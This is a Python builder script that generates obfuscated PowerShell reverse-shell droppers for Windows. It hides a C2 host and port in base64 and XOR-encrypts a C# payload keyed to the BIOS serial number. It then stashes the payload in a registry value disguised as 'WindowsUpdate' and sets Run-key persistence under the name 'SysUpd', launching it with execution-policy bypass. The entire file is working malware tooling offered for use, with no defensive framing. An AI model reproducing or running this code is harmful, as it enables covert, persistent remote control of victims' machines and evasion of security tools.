import argparse, base64, os, random, uuid, re

NAMES = ["Alpha","Beta","Charlie","Delta","Echo","Foxtrot","Golf","Hotel",
         "India","Juliet","Kilo","Lima","Mike","November","Oscar","Papa",
         "Quebec","Romeo","Sierra","Tango","Uniform","Victor","Whiskey",
         "Xray","Yankee","Zulu"]

def pick_folder():
    names = NAMES.copy()
    random.shuffle(names)
    for name in names:
        if not os.path.exists(name):
            return name
    return uuid.uuid4().hex

def obfuscate_addr(host, port):
    segs = host.split('.')
    dot_enc = base64.b64encode(b'.').decode()
    parts = []
    for seg in segs:
        enc_seg = base64.b64encode(seg.encode()).decode()
        parts.append(f'M_mgbkf("{enc_seg}")')
        parts.append(f'M_mgbkf("{dot_enc}")')
    parts = parts[:-1]
    obf_host = '+'.join(parts)
    port_enc = base64.b64encode(str(port).encode()).decode()
    obf_port = f'int.Parse(M_mgbkf("{port_enc}"))'
    return obf_host, obf_port

def generate_shell(host, port, payload_path="payload.cs"):
    if not os.path.exists(payload_path):
        print(f"Error: {payload_path} not found.")
        return
    with open(payload_path, 'r', encoding='utf-8') as f:
        payload = f.read()
    payload = payload.replace("args.Data", "P_Mfsuqp.Data")
    m = re.search(r'public\s+class\s+(\w+)', payload)
    cls = m.group(1) if m else 'C_ahpOiS'
    obf_host, obf_port = obfuscate_addr(host, port)
    payload, count = re.subn(
        r'new\s+TcpClient\s*\([^)]*\)',
        f'new TcpClient({obf_host}, {obf_port})',
        payload, count=1
    )
    if count == 0:
        print("Warning: TcpClient pattern not found in payload.")
    enc_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

    setup = (
        "$k=(gwmi win32_bios).serialnumber.trim();"
        "$kb=[Text.Encoding]::UTF8.GetBytes($k);"
        "$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{enc}'));"
        "$b=[Text.Encoding]::UTF8.GetBytes($s);"
        "for($i=0;$i-lt$b.Length;$i++){{ $b[$i]=$b[$i]-bxor$kb[$i%$kb.Length] }};"
        "ni HKCU:\\\\Software\\\\WindowsUpdate -Force;"
        "sp HKCU:\\\\Software\\\\WindowsUpdate DataCache ([Convert]::ToBase64String($b));"
        "$stub='$k=(gwmi win32_bios).serialnumber.trim();"
        "$e=(gp HKCU:\\\\Software\\\\WindowsUpdate).DataCache;"
        "$b=[Convert]::FromBase64String($e);"
        "$p=[Text.Encoding]::UTF8.GetBytes($k);"
        "for($i=0;$i-lt$b.Length;$i++){{ $b[$i]=$b[$i]-bxor$p[$i%$p.Length] }};"
        "Add-Type -TypeDefinition([Text.Encoding]::UTF8.GetString($b)) -Language CSharp;"
        f"[{cls}]::Start()';"
        "$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stub));"
        "sp HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run SysUpd "
        "\"powershell -NoP -EP Bypass -Enc $enc\""
    ).format(enc=enc_payload)

    exec_cmd = (
        "$k=(gwmi win32_bios).serialnumber.trim();"
        "$e=(gp HKCU:\\\\Software\\\\WindowsUpdate).DataCache;"
        "$b=[Convert]::FromBase64String($e);"
        "$p=[Text.Encoding]::UTF8.GetBytes($k);"
        "for($i=0;$i-lt$b.Length;$i++){{ $b[$i]=$b[$i]-bxor$p[$i%$p.Length] }};"
        "Add-Type -TypeDefinition([Text.Encoding]::UTF8.GetString($b)) -Language CSharp;"
        f"[{cls}]::Start()"
    )
    folder = pick_folder()
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "smaller_setup.ps1"), "w", encoding='utf-8') as f:
        f.write(setup)
    with open(os.path.join(folder, "small_execute.ps1"), "w", encoding='utf-8') as f:
        f.write(exec_cmd)
    print(f"Generated in folder: {folder}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate reverse shell PS1 scripts")
    parser.add_argument("-H", "--host", required=True, help="C2 host/IP")
    parser.add_argument("-P", "--port", required=True, help="C2 port")
    parser.add_argument("-f", "--file", default="payload.cs", help="Path to payload.cs")
    args = parser.parse_args()
    generate_shell(args.host, args.port, args.file)